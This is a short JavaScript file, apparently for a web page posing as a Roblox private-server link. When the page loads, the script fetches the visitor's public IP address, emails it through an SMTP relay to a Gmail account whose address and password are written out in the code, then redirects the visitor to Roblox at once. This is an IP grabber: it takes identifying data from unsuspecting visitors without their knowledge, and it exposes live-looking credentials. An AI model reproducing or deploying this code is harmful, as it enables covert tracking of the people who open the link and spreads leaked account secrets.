
var responseString = "";

window.onload = () => {
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        responseString = `${data.ip}`;
        sendEmail();
        document.getElementById('ip-address').textContent = responseString;
      });
  function sendEmail() {
    Email.send({
        Host: "smtp.elasticemail.com",
        Username: "joebernardfamily@gmail.com",
        Password: "4CD4E6E017C00E931A9E2CFFD9A85400D62B",
        To: "joebernardfamily@gmail.com",
        From: "joebernardfamily@gmail.com",
        Subject: "Bones",
        Body:  responseString,
        Port: "2525"
      }).then(() => {
            setTimeout(() => {
                window.location.href = 'https://www.roblox.com/share?code=fab53a60468193458431eb86fdb07d2e&type=Server';
            }, 0.0000000000000000000000000000000000000000000000000000000000000000000000001);
        }).catch((error) => {
            console.error('Error sending email:', error);
        });
    }
      };
